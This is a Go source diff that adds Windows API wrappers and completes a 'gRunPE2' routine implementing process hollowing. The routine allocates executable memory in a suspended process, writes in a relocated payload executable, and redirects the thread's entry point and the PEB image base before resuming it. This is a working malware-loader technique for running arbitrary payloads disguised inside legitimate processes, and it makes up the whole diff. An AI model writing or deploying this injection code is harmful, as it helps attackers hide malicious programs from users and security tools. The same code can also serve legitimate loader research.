@@ -51,7 +51,9 @@ func IsBadReadPtr(lp uintptr, ucb uint64) bool {
 }
 
 //VirtualAlloc func
-func VirtualAlloc(lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32) (addr uintptr, e error) {
+func VirtualAlloc(
+	lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32,
+) (addr uintptr, e error) {
 	ret, _, err := procVirtualAlloc.Call(
 		lpAddress,
 		uintptr(dwSize),
@@ -62,6 +64,24 @@ func VirtualAlloc(lpAddress uintptr, dwSize uint64, flAllocationType uint32, flP
 	}
 	addr = ret
 	log.Printf("VirtualAlloc[%x]: [%X] %v\n", lpAddress, ret, err)
+	return
+}
+
+//VirtualAllocEx func
+func VirtualAllocEx(
+	hProcess syscall.Handle, lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32,
+) (addr uintptr, e error) {
+	ret, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		lpAddress,
+		uintptr(dwSize),
+		uintptr(flAllocationType),
+		uintptr(flProtect))
+	if ret == 0 {
+		e = err
+	}
+	addr = ret
+	log.Printf("VirtualAllocEx[%v : %x]: [%v] %v", hProcess, lpAddress, ret, err)
 	return
 }
 
@@ -616,6 +636,250 @@ func ResumeThread(hThread syscall.Handle) (count int32, e error) {
 	return
 }
 
+//WriteProcessMemory func
+func WriteProcessMemory(
+	hProcess syscall.Handle, lpBaseAddress uintptr, data uintptr, size uint64,
+) (e error) {
+	var numBytesRead uintptr
+	r, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		lpBaseAddress,
+		data,
+		uintptr(size),
+		uintptr(unsafe.Pointer(&numBytesRead)))
+	if r == 0 {
+		e = err
+	}
+	log.Printf("WriteProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
+	return
+}
+
+//Wow64GetThreadContext func
+func Wow64GetThreadContext(h syscall.Handle, pc *WOW64_CONTEXT) bool {
+	r, _, err := procWow64GetThreadContext.Call(
+		uintptr(h), uintptr(unsafe.Pointer(pc)),
+	)
+	if r == 0 {
+		log.Println("Error Wow64GetThreadContext: ", err.Error())
+		return false
+	}
+
+	return int(r) > 0
+}
+
+//Wow64SetThreadContext func
+func Wow64SetThreadContext(h syscall.Handle, pc *WOW64_CONTEXT) bool {
+	r, _, err := procWow64SetThreadContext.Call(
+		uintptr(h), uintptr(unsafe.Pointer(pc)),
+	)
+	if r == 0 {
+		log.Println("Error Wow64SetThreadContext: ", err.Error())
+		return false
+	}
+
+	return int(r) > 0
+}
+
+//GetThreadContext func
+func GetThreadContext(hThread syscall.Handle, ctx *CONTEXT) (e error) {
+	r, _, err := procGetThreadContext.Call(
+		uintptr(hThread), uintptr(unsafe.Pointer(ctx)),
+	)
+	if r == 0 {
+		e = err
+	}
+	log.Printf("GetThreadContext[%v]: [%v] %v", hThread, r, err)
+	return
+}
+
+//SetThreadContext func
+func SetThreadContext(hThread syscall.Handle, ctx *CONTEXT) (e error) {
+	r, _, err := procSetThreadContext.Call(
+		uintptr(hThread), uintptr(unsafe.Pointer(ctx)),
+	)
+	if r == 0 {
+		e = err
+	}
+	log.Printf("SetThreadContext[%v]: [%v] %v", hThread, r, err)
+	return
+}
+
+//UpdateImageBase func
+func UpdateImageBase(payload, destImageBase uintptr) bool {
+	is64b := gIs64Bit(payload)
+	payloadNTHdr := GetNTHdrs(payload, 0)
+	if payloadNTHdr == 0 {
+		return false
+	}
+	if is64b {
+		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
+		payloadNTHdr64.OptionalHeader.ImageBase = uint64(destImageBase)
+	} else {
+		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
+		payloadNTHdr32.OptionalHeader.ImageBase = uint32(destImageBase)
+	}
+	return true
+}
+
+//GetEntryPointRVA func
+func GetEntryPointRVA(peBuffer uintptr) uint32 {
+	is64b := gIs64Bit(peBuffer)
+	//update image base in the written content:
+	payloadNTHdr := GetNTHdrs(peBuffer, 0)
+	if payloadNTHdr == 0 {
+		return 0
+	}
+	var value uint32
+	if is64b {
+		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
+		value = payloadNTHdr64.OptionalHeader.AddressOfEntryPoint
+	} else {
+		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
+		value = payloadNTHdr32.OptionalHeader.AddressOfEntryPoint
+	}
+	return value
+}
+
+//UpdateRemoteEntryPoint func
+func UpdateRemoteEntryPoint(
+	pi *syscall.ProcessInformation, entryPointVA uintptr, is32bit bool,
+) bool {
+	log.Println("Writing new EP: ", entryPointVA)
+	if is32bit {
+		// The target is a 32 bit executable while the loader is 64bit,
+		// so, in order to access the target we must use Wow64 versions of the functions:
+
+		// 1. Get initial context of the target:
+		var context WOW64_CONTEXT
+		mem.Memset(
+			unsafe.Pointer(&context), 0, int(unsafe.Sizeof(WOW64_CONTEXT{})))
+		context.ContextFlags = CONTEXT_INTEGER
+		if !Wow64GetThreadContext(pi.Thread, &context) {
+			return false
+		}
+		// 2. Set the new Entry Point in the context:
+		context.Eax = uint32(entryPointVA)
+
+		// 3. Set the changed context into the target:
+		return Wow64SetThreadContext(pi.Thread, &context)
+	}
+	// 1. Get initial context of the target:
+	var context CONTEXT
+	mem.Memset(
+		unsafe.Pointer(&context), 0, int(unsafe.Sizeof(CONTEXT{})))
+	context.contextflags = CONTEXT_INTEGER
+	err := GetThreadContext(pi.Thread, &context)
+	if err != nil {
+		log.Println("Error GetThreadContext: ", err.Error())
+		return false
+	}
+	// 2. Set the new Entry Point in the context:
+	context.rcx = uint64(entryPointVA)
+	// 3. Set the changed context into the target:
+	err = SetThreadContext(pi.Thread, &context)
+	if err != nil {
+		log.Println("Error SetThreadContext: ", err.Error())
+		return false
+	}
+	return true
+}
+
+//GetRemotePebAddr func
+func GetRemotePebAddr(pi *syscall.ProcessInformation, is32bit bool) uintptr {
+	if is32bit {
+		//get initial context of the target:
+		var context WOW64_CONTEXT
+		mem.Memset(
+			unsafe.Pointer(&context), 0, int(unsafe.Sizeof(WOW64_CONTEXT{})))
+		context.ContextFlags = CONTEXT_INTEGER
+		if !Wow64GetThreadContext(pi.Thread, &context) {
+			log.Println("Wow64 cannot get context!")
+			return 0
+		}
+		//get remote PEB from the context
+		return uintptr(context.Ebx)
+	}
+	var PEBAddr uintptr
+	var context CONTEXT
+	mem.Memset(
+		unsafe.Pointer(&context), 0, int(unsafe.Sizeof(CONTEXT{})))
+	context.contextflags = CONTEXT_INTEGER
+	err := GetThreadContext(pi.Thread, &context)
+	if err != nil {
+		log.Println("Error GetThreadContext: ", err.Error())
+		return 0
+	}
+	PEBAddr = uintptr(context.rdx)
+	return PEBAddr
+}
+
+//GetImgBasePebOffset func
+func GetImgBasePebOffset(is32bit bool) uintptr {
+	/*
+	   We calculate this offset in relation to PEB,
+	   that is defined in the following way
+	   (source "ntddk.h"):
+
+	   typedef struct _PEB
+	   {
+	       BOOLEAN InheritedAddressSpace; // size: 1
+	       BOOLEAN ReadImageFileExecOptions; // size : 1
+	       BOOLEAN BeingDebugged; // size : 1
+	       BOOLEAN SpareBool; // size : 1
+	                       // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
+	       HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit
+
+	       PVOID ImageBaseAddress;
+	       [...]
+	*/
+	var imgBaseOffset uintptr
+	if is32bit {
+		imgBaseOffset = unsafe.Sizeof(new(uint32)) * 2
+	} else {
+		imgBaseOffset = unsafe.Sizeof(new(uintptr)) * 2
+	}
+	return imgBaseOffset
+}
+
+//gRedirectToPayload func
+func gRedirectToPayload(
+	loadedPE uintptr, loadBase uintptr, pi *syscall.ProcessInformation, is32bit bool,
+) bool {
+	//1. Calculate VA of the payload's EntryPoint
+	ep := GetEntryPointRVA(loadedPE)
+	epVA := loadBase + uintptr(ep)
+
+	//2. Write the new Entry Point into context of the remote process:
+	if UpdateRemoteEntryPoint(pi, epVA, is32bit) == false {
+		log.Println("Cannot update remote EP!")
+		return false
+	}
+	//3. Get access to the remote PEB:
+	remotePebAddr := GetRemotePebAddr(pi, is32bit)
+	if remotePebAddr == 0 {
+		log.Println("Failed getting remote PEB address!")
+		return false
+	}
+	// get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
+	remoteImgBase := remotePebAddr + GetImgBasePebOffset(is32bit)
+	//calculate size of the field (depends on architecture):
+	var imgBaseSize uint64
+	if is32bit {
+		imgBaseSize = uint64(unsafe.Sizeof(new(uint32)))
+	} else {
+		imgBaseSize = uint64(unsafe.Sizeof(new(uintptr)))
+	}
+
+	//4. Write the payload's ImageBase into remote process' PEB:
+	err := WriteProcessMemory(
+		pi.Process, remoteImgBase, loadBase, imgBaseSize)
+	if err != nil {
+		log.Println("Error WriteProcessMemory: ", err.Error())
+		return false
+	}
+	return true
+}
+
 //gRunPE2 func
 func gRunPE2(
 	loadedPE uintptr, payloadImageSize uint64, pi *syscall.ProcessInformation, is32bit bool,
@@ -625,15 +889,37 @@ func gRunPE2(
 	}
 
 	//1. Allocate memory for the payload in the remote process:
+	remoteBase, err := VirtualAllocEx(
+		pi.Process, 0, payloadImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+	)
+	if err != nil {
+		log.Println("Error VirtualAllocEx: ", err.Error())
+		return false
+	}
+	log.Printf("Allocated remote ImageBase: %X size: %d\n", remoteBase, payloadImageSize)
 
 	//2. Relocate the payload (local copy) to the Remote Base:
-
+	if !gRelocateModule(loadedPE, payloadImageSize, remoteBase, 0) {
+		log.Println("Could not relocate the module!")
+		return false
+	}
 	//3. Update the image base of the payload (local copy) to the Remote Base:
+	UpdateImageBase(loadedPE, remoteBase)
 
+	log.Println("Writing to remote process...")
 	//4. Write the payload to the remote process, at the Remote Base:
-
+	err = WriteProcessMemory(
+		pi.Process, remoteBase, loadedPE, payloadImageSize)
+	if err != nil {
+		log.Println("Error WriteProcessMemory: ", err.Error())
+		return false
+	}
+	log.Println("Loaded at: ", loadedPE)
 	//5. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
-
+	if !gRedirectToPayload(loadedPE, remoteBase, pi, is32bit) {
+		log.Println("Redirecting failed!")
+		return false
+	}
 	//6. Resume the thread and let the payload run:
 	ResumeThread(pi.Thread)
 	return true
